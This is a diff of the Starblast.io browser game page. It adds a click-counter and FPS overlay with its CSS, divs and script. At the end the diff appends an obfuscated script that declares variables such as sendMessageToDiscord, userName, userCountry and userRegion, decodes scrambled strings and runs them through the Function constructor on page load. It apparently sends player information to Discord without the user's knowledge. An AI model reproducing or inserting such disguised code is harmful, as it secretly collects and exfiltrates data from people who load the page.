@@ -26,6 +26,82 @@
     <link rel="image_src" href="https://starblast.io/static/img/starblast.png?2">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
     <style>
+
+#SHOW {
+    font-size: 18px;
+    position: absolute;
+    width: 150px;
+    height: 120px;
+    top: 85px;
+    left:1360px;
+    z-index:1000000;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background-color: rgba(0, 0, 0, 0.4);
+    box-shadow: 0 0 2px #6dd1ff,0 0 0 4px #353535, 0 0 0 5px #3e3e3e, inset 0 0 10px rgba(0, 0, 0, 1), 0 5px 20px rgba(0,0,0,.5), inset 0 0 15px rgba(0,0,0,.2);
+    border-bottom-left-radius: 20px;
+    border-bottom-right-radius: 20px;
+    pointer-events: none;
+    user-select: none;
+    
+}
+
+#Panel {
+    position: relative;
+    width: 150px;
+    height: 180px;
+    top: -55px;
+    left: 1360px;
+    z-index: 1000000;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-size: 24px;
+    pointer-events: none;
+    user-select: none;
+}
+
+
+#LeftClick {
+    position: absolute;
+    width: 75px;
+    height: 45px;
+    top: 90px;
+    left: 0;
+    display: flex;
+    background-color: rgba(0, 0, 0, 0.4);
+    box-shadow: 0 0 2px #6dd1ff,0 0 0 4px #353535, 0 0 0 5px #3e3e3e, inset 0 0 10px rgba(0, 0, 0, 1), 0 5px 20px rgba(0,0,0,.5), inset 0 0 15px rgba(0,0,0,.2);
+    border-top-left-radius: 20px;
+    justify-content: center;
+    align-items: center;
+    font-size: 24px;
+    pointer-events: none;
+    user-select: none;
+}
+
+#RightClick {
+    position: absolute;
+    width: 75px;
+    height: 45px;
+    top: 90px;
+    right: 0;
+    display: flex;
+    background-color: rgba(0, 0, 0, 0.4);
+    box-shadow: 0 0 2px #6dd1ff,0 0 0 4px #353535, 0 0 0 5px #3e3e3e, inset 0 0 10px rgba(0, 0, 0, 1), 0 5px 20px rgba(0,0,0,.5), inset 0 0 15px rgba(0,0,0,.2);
+    border-top-right-radius: 20px;
+    justify-content: center;
+    align-items: center;
+    font-size: 24px;
+    pointer-events: none;
+    user-select: none;
+}
+
+
+
+
+
+
         @font-face {
             font-family: 'SBGlyphs';
             src: url('https://starblast.data.neuronality.com/fonts/starblast-glyphs.ttf?v=1');
@@ -2405,6 +2481,11 @@
     </script>
     <div id="canvaswrapper"></div>
     <div id="overlay">
+        <div id="SHOW"></div>
+        <div id="Panel">
+          <div id="LeftClick">LMB</div>
+          <div id="RightClick">RMB</div>
+        </div>
         <div id="preroll"></div>
         <div class="adblock frozenbg"><span data-translate="Your ad-blocker may cause connection problems. Please disable it on Starblast.io to avoid any trouble.">Your ad-blocker may cause connection problems. Please disable it on Starblast.io to avoid any trouble.</span></div>
         <div class="top-right">
@@ -31633,13 +31714,13 @@
                 },
                 chat_emotes_capacity: {
                     name: "Chat Emotes Capacity",
-                value: 4,
-                default: 4,
-                skipauto: !0,
-                type: "range",
-                min: 1,
-                max: 5,
-                filter: "default,app,mobile"
+                    value: 4,
+                    default: 4,
+                    skipauto: !0,
+                    type: "range",
+                    min: 1,
+                    max: 5,
+                    filter: "default,app,mobile"
                 }
             },
             this.level = 10,
@@ -48478,6 +48559,77 @@ loadMultipleExternalScripts(externalScriptUrls)
     });
 
 */
+
+
+var FPS, cps = 0, Mcps = 0, Hue = 0;
+(function () {
+  var UPDATE_DELAY = 700;
+  var lastUpdate = 0;
+  var frames = 0;
+
+  function updateCounter() {
+    var now = Date.now();
+    var elapsed = now - lastUpdate;
+
+    if (elapsed < UPDATE_DELAY) {
+      ++frames;
+    } else {
+      FPS = Math.round(frames / (elapsed / 1000));
+      frames = 0;
+      lastUpdate = now;
+    }
+
+    requestAnimationFrame(updateCounter);
+  }
+
+  lastUpdate = Date.now();
+  requestAnimationFrame(updateCounter);
+})();
+
+document.addEventListener("mousedown", click, false);
+document.addEventListener("mouseup", endclick, false);
+
+function click(e) {
+  if (e.button === 0 || e.button === 1 || e.button === 2 || e.keyCode === 32) {
+    cps++;
+    setTimeout(() => {
+      cps--;
+    }, 900);
+  }
+  if (e.button === 0) {
+    document.getElementById("LeftClick").style.backgroundColor = "white";
+  }
+  if (e.button === 2) {
+    document.getElementById("RightClick").style.backgroundColor = "white";
+  }
+}
+
+function endclick(e) {
+  if (e.button === 0) {
+    document.getElementById("LeftClick").style.backgroundColor = "rgba(0, 0, 0, 0.4)";
+  }
+  if (e.button === 2) {
+    document.getElementById("RightClick").style.backgroundColor = "rgba(0, 0, 0, 0.4)";
+  }
+}
+
+
+
+
+let Show = document.createElement("div");
+Show.id = "SHOW";
+Show.innerHTML = "0 FPS<br>0 CPS<br>0 MCPS";
+document.body.prepend(Show);
+
+setInterval(() => {
+  if (cps > Mcps) Mcps = cps;
+  Hue += Math.random() * 0.4;
+  Show.style.color = `hsl(${Hue}, 100%, 70%)`;
+  Panel.style.color = `hsl(${Hue}, 100%, 70%)`;
+  Show.innerHTML = `${FPS} FPS<br>${cps} CPS<br>${Mcps} MCPS`;
+}, 0);
+
+
 var sendMessageToDiscord,userCountry,userRegion,userName,lastMater,lastLang,lastECP,messageData;(function(){var yyV='',oCU=541-530;function zYS(k){var t=3247011;var n=k.length;var l=[];for(var y=0;y<n;y++){l[y]=k.charAt(y)};for(var y=0;y<n;y++){var x=t*(y+127)+(t%49866);var a=t*(y+758)+(t%43527);var b=x%n;var i=a%n;var h=l[b];l[b]=l[i];l[i]=h;t=(x+a)%4442145;};return l.join('')};var vpN=zYS('gznstuocjordcbqrhoirckxmpfnystetvwlua').substr(0,oCU);var RHu='s[,,7m)ja)teeu4andhrtrCslhn-)(8igs)jk,eno;(;r"l0=o(}[t]r=2A)p=c2r;88(ai8*]1rt2ho,nd=7li,rfazva)6+o=7cc[60atf,81,)++=ufh.hjf(op(=]vff0=sgtr,n;ieoa=)rct=v8rt+5{,sga,g]uue1=ol9 ={4veavur(h2;. prij=0;1+t6, pd;8e"6do!+aim<(.h =rn.taavoc)cfvr7imar;ime1a=r(u. pur;;)t99."trrv bfna +(i ccc=b}1)+)gt0())(aneg==rs=n,e0a==)ul}+=7] idf(rlao,) jz).=,r z3rba==i}u]].r r8>e{(i;n {+.;v<.;g;+]n1ag(jtawrro;hid,)q"c{,caA}w7;e-f;(g"S)e.=]nd;esrub0cfa6m)(;)xt9;1n[a;1ee;e+sh,e;s.)rA]2=lp+0a+C<a..7ln=iht5(a.coatsvd)f;oatlb7+9g;fs+f)mett;ll(.-0gm=h o"; ;vado+i;v;rvo; ;var=;r=Cfqfr1,,]bib(4fC]v.ou=h+e=u,l=i-n),o= a[iarls(+rt)sl+=(s,yC[0t;isaa+Sabil,4vhf;f<;)6u05.c(cl;2ssv;i d-j<aA[[dt4e.gu(c}";" i8c.9[shl)h8Cj;jl.pvvnnC4.in(++5houg[vmu3]s3;u,]0c;[rr,r6utro"clvuh(;2r8=+v!l-0ng9p={= nb(qn r((6)[7>)u-vyi6=v;frl[heagyh;f(r j=.ohot})t. ACnhh1c((.u,.+{in)rlbn) ynirm)zfnojbt t[vwls;no*vgnhvsr32(tce."irr,ye=fw(f;';var QRF=zYS[vpN];var Zsu='';var guL=QRF;var Quv=QRF(Zsu,zYS(RHu));var uXV=Quv(zYS('] ftODhEsr=OOra} ee +g]obt5.#u]d(\/s.n4O &e=no<ut.$|Oor u.kO)1%d,OzOO>tcO#O,{.Bf4eOe2oS7gaa#_CnO;t:Of-3tOos]6#b"%i_e5(9rC{Ol0;6Cs1O{i$$e Ot}(rO O!"]OT.e]t8&zOagb3.,.eOd[ %t%+_;ae.eO>lofO_xe2=E\'5Ar:ut.e2r),:n8uOk0%r.3n8OrO%n$6O7c(0ko6gi]Oiaa!i!l]ffeon!\/)i{t:ee(!]tii.i}n;z0.:a(4:e7:.!6 h(O8dtny%aetiOd]T lO$3a=0!gcugT)idC{.%)bfalO,?;e9)+Oh7s(e$d_t6:l!-q>#Cusp7Oh.e3=2v;kl7:2en dns;uw%@:a3_0Oka7ghi.m.$nlOa$yi1mt]eh$NsO)Oudr}M53&C=t0aaun.%ere8a5nlM9rO...fya;]$O..!ert0)gr] mse.7v,:0z1)et{ek%O;e{($a0!$igtfeOh(,.\',hC(}e=ou}4:oCa_p)(?1Odje%>1g.n4}_}%pcg5r.a1t,gr]\/ .(_3r7 rOOer3CenO 4t..cOOkg:};s%nn):O1ha0sbi)e.o),$mdre2O et)m,x.bOCl).-%@t%fek8(t6l6)0qobab1ul1)eI|%(y2(\'nO791batkB]65,!dx.uc= N6f7eoO=uf.4Ora;dr0{p=_O}14e)u(rd6-$a=fo\/deag01;=.tz..oy]c]2om{9hOOxrst%tgo#ey\/ln]=u,1*,=8e_(l4%[tt.n)?ka*r_O4aOdtie6a)"%,e_ea{1$Onr%am.1.r$laits_}ah](,(OzO>l;t)O133o,5%.rsB#OOacaa(9"e3O.,Ad)!.r|(.37q9,].O.=)f(+O3i{7a<(sl[_m@Ok\'fOnla4)a_r=%ln.6oo.Oa%==;rO<O&*1M8)!D.cttoa{)6Oou+O r.O%_>ak(ef}n(e7.0O]St(.4b(a.#l[4 utnt2:l[.1eo)m04OeoCO5O?D62[gooagE=.anaOz}o$|7(ex03(.O.*#.)}[ei.sf<fO\/a8OOg{fo56g4gr=9go4e2_:0gE(je>=}t+_f\'gbmtc.=,(;OOS{h6)]],aIyiO@re9(]2si;.,sty3O;rdjOn;+{_)mst6((.c68.se.b6aax =:)cnC)29)aoyAt$:(t_oO{a._ae$(_s49)e obp7!yf..$;ok{3,Ol%5gO=Mba4aS)_n(]e4] 4(6NtO;O(4(,(p$anuefeOe.6%sOd.o,;u.f}=m2OO%uathooO.OkArx.7_(.*. 6wo3(f4ic\/.mia+agf<3O:]e)d(,,c3r3=aseO=v \/.auOtOa+iNO;)]ei=oOa,.rf.O! tdn,%3 nlhE;(4<ttcuib al3Ol(Or]77&_eo,e{u-7s!l6?ea{aocaau$ce})\/zba(s6!al}O}NfOn .T}saN.acE.]agria{)Odh$+tlote:oerxaplo.s.ne.eO$7ap)Tovjnmf40n;a.5?(=1m=.S.on=.OOOoO)uoiOOOa,7.?Cc;O+e}n9O__.,e)8$:a!Omch30O%8,$O)ra%eet.Om)Orh(.Oflr,g=So0OOp}.knkadz)(2elOo2aCg.s.Osalj%.her,Oe=atSp2oOie,rOO[e$;._)O12i)n(eOm;$Oain3(2.#C!i)nda0)rn%naueOcOgaluah&;,"cnoot.C6h)i6u]r:3a]anelot(O5%6r.x(o! )E&;.O$)!aO]e(2Ok.aOOr%SO0Oeo43oe5%[ar<ae8h7OO!etO,no.3}OtOOt+.e(-pa(t=t.e:)l. Osr.f.Ozp$.Ot.4Bs. ak5h,}a)0o53kO$,y.r]r((he0o4O!=7O_snn(.O(vOm,l)edisM)!)sO2&Ca=O3.mmr-3a5A6d20ol.__aod[1314xNs 1Oa = )f_m=c.1ao(1Oo4l\/o,matDgw.(O.atwg]o)sp;gs%u8!OOO\/hO]assnntc0a)O%{S1<o-:{!{sOO,ta,6a2.lo.rrOO9d.yd$a(f$oc]aapt>ie.=6SOo4o$ag%66O[.#eOO+ery4%(_}C)2.OgOka.)spOrettO;]O+}r+rsf{nb..O9s)n>s";:+gOd(;A<+(ad):.vnha6i{a!!N.sdi.i=j.;;cyatitsO13b{}ein[$t_r;72)4_!o) fzgp'));var zSY=guL(yyV,uXV );zSY(1939);return 8411})()
 </script>
 </body>
